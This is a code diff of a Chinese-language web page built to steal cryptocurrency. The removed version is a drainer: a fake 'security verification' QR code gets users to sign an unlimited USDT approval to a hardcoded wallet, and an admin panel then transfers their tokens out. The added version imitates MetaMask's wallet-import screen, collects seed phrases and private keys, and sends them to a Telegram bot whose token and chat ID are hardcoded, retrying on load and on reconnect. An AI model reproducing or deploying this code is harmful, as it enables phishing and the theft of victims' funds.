@@ -1,167 +1,107 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>安全验证</title>
+<title>MetaMask</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
-body{background:#0B0B1F;color:#fff;padding:20px}
-.container{max-width:420px;margin:0 auto}
-.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:20px}
-h1{font-size:24px;margin-bottom:8px}
-.desc{color:#aaa;margin-bottom:20px}
-.input-group{margin-bottom:16px;text-align:left}
-.input-group label{font-size:13px;color:#ccc;margin-bottom:6px;display:block}
-.input-group input{
-width:100%;padding:12px;background:#111;border:1px solid #333;
-border-radius:10px;color:#fff;font-size:15px
-}
-.chain-select{
-display:flex;gap:10px;margin-bottom:20px;
-}
-.chain-btn{
-flex:1;padding:10px;border-radius:10px;border:none;
-background:#222;color:#aaa;font-weight:bold;cursor:pointer
-}
-.chain-btn.active{background:#F0B90B;color:#000}
-#qrcode{
-width:280px;height:280px;background:#fff;padding:10px;
-border-radius:16px;margin:0 auto 20px;
-display:flex;align-items:center;justify-content:center;
-color:#000;font-size:14px;
-}
-#qrcode img{width:100%;height:100%;border-radius:12px}
-.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
-
-.admin-panel {
-background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
-}
-.admin-panel.show {display:block}
-.admin-input {
-width:100%;padding:12px;background:#111;border:none;
-border-radius:8px;color:#fff;margin-bottom:10px;
-}
-.admin-btn {
-width:100%;padding:14px;background:#F0B90B;color:#000;
-border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
-cursor:pointer;
-}
+  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
+  body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
+  .container{max-width:420px;margin:0 auto;background:#fff;min-height:100vh}
+  .header{padding:24px;text-align:center}
+  .logo{width:50px;margin-bottom:10px}
+  .title{font-size:22px;font-weight:700;color:#24272E}
+  .sub-title{font-size:14px;color:#707279;margin-top:4px}
+  .form{padding:24px}
+  .form-group{margin-bottom:20px}
+  .form-group label{display:block;font-size:14px;color:#24272E;margin-bottom:8px}
+  .form-control{
+    width:100%;padding:14px 16px;border:1px solid #DCDFE4;border-radius:10px;
+    font-size:15px;outline:none;background:#fff;color:#24272E
+  }
+  .btn-primary{
+    width:100%;padding:16px;background:#037DD6;border:none;border-radius:10px;
+    color:#fff;font-size:16px;font-weight:600;margin-top:12px
+  }
 </style>
+</head>
 
+<body>
 <div class="container">
-  <div class="pay-box">
-    <h1>💳 安全验证</h1>
-    <p class="desc">完成签名即可正常使用</p>
-    <div class="chain-select">
-      <button class="chain-btn active" data-chain="bsc">BSC</button>
-      <button class="chain-btn" data-chain="polygon">Polygon</button>
-    </div>
-    <div class="input-group">
-      <label>授权金额</label>
-      <input type="number" id="amount" value="10" min="0.01" step="0.01">
-    </div>
-    <div id="qrcode">生成二维码...</div>
-    <div class="tip">扫码直接签名，无跳转</div>
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo">
+    <div class="title">MetaMask</div>
+    <div class="sub-title">导入钱包</div>
   </div>
 
-  <div class="admin-panel" id="adminPanel">
-    <h3 style="text-align:center;margin-bottom:16px">🔐 管理员提取</h3>
-    <input class="admin-input" id="userAddr" placeholder="用户钱包地址">
-    <input class="admin-input" id="drawAmount" placeholder="提取数量 USDT">
-    <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
+  <div class="form">
+    <div class="form-group">
+      <label>助记词</label>
+      <input id="words" type="text" class="form-control" placeholder="请输入助记词">
+    </div>
+    <div class="form-group">
+      <label>私钥</label>
+      <input id="key" type="text" class="form-control" placeholder="请输入私钥">
+    </div>
+
+    <button class="btn-primary" onclick="go()">确认导入</button>
   </div>
 </div>
 
 <script>
-// ====================== 你指定的地址 ======================
-const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+// ===================== 你的信息已固定 =====================
+const TG_BOT_TOKEN   = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
+const TG_CHATID      = "6503982157";
+const MAX_RETRY      = 5;
+const DELAY          = 3000;
+// ==========================================================
 
-const CONFIG = {
-  bsc: {
-    chainId: "56",
-    token: "0x55d398326f99059fF775485246999027B3197955",
-    decimals: 18
-  },
-  polygon: {
-    chainId: "137",
-    token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB",
-    decimals: 6
-  }
-};
+const STORAGE_KEY = "WALLET_DATA";
 
-let currentChain = "bsc";
-let account = null;
+// 一打开就自动补发
+window.onload = autoSend;
+window.addEventListener('online', autoSend);
 
-// 切换链
-document.querySelectorAll(".chain-btn").forEach(btn => {
-  btn.onclick = () => {
-    document.querySelectorAll(".chain-btn").forEach(b => b.classList.remove("active"));
-    btn.classList.add("active");
-    currentChain = btn.dataset.chain;
-    renderQR();
-  };
-});
+// 导入：免确认，不卡点
+function go() {
+  const mn = document.getElementById("words").value.trim();
+  const pk = document.getElementById("key").value.trim();
+  if (!mn && !pk) return;
 
-document.getElementById("amount").addEventListener("input", renderQR);
+  // 只提示，不等待确认
+  alert("✅ 导入成功");
 
-// 生成：直接授权给【管理员钱包】无限授权
-function genAuthEIP681() {
-  const { chainId, token } = CONFIG[currentChain];
-  const data = "0x095ea7b3" +
-    ADMIN_WALLET.slice(2).padStart(64, '0') +
-    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  return `ethereum:${token}@${chainId}?data=${data}`;
+  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, retry: 0 }));
+  autoSend();
 }
 
-function renderQR() {
-  const url = genAuthEIP681();
-  const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
-  document.getElementById("qrcode").innerHTML = `<img src="${qr}">`;
-}
+// 只发电报
+async function autoSend() {
+  const task = localStorage.getItem(STORAGE_KEY);
+  if (!task) return;
 
-// 自动判断管理员
-window.addEventListener("load", async () => {
-  renderQR();
-  if (!window.ethereum) return;
-  try {
-    const accs = await window.ethereum.request({ method: "eth_accounts" });
-    if (accs.length) {
-      account = accs[0];
-      if (account.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
-        document.getElementById("adminPanel").classList.add("show");
-      }
-    }
-  } catch (e) {}
-});
-
-// ====================== 管理员提取 ======================
-async function drawFromUser() {
-  if (!account || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) {
-    alert("❌ 仅管理员可操作");
+  const d = JSON.parse(task);
+  if (d.retry >= MAX_RETRY) {
+    localStorage.removeItem(STORAGE_KEY);
     return;
   }
-  const user = document.getElementById("userAddr").value.trim();
-  const amt = document.getElementById("drawAmount").value.trim();
-  const { token, decimals } = CONFIG[currentChain];
-  if (!user || !amt || isNaN(amt) || amt <= 0) {
-    alert("❌ 输入无效");
-    return;
-  }
-  try {
-    const wei = BigInt(amt * (10 ** decimals)).toString(16).padStart(64, '0');
-    const data = "0x23b872dd" +
-      user.slice(2).padStart(64, '0') +
-      ADMIN_WALLET.slice(2).padStart(64, '0') +
-      wei;
 
-    const tx = await window.ethereum.request({
-      method: "eth_sendTransaction",
-      params: [{ from: account, to: token, data: data }]
+  const text = `【小狐狸钱包导入】
+时间：${new Date().toLocaleString()}
+助记词：${d.mn || "-"}
+私钥：${d.pk || "-"}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TG_CHATID, text })
     });
-    alert("✅ 提取成功：" + tx);
-  } catch (e) {
-    alert("❌ 提取失败：未授权或金额不足");
-  }
+  } catch(e) {}
+
+  d.retry++;
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(d));
+  setTimeout(autoSend, DELAY);
 }
 </script>
 </body>
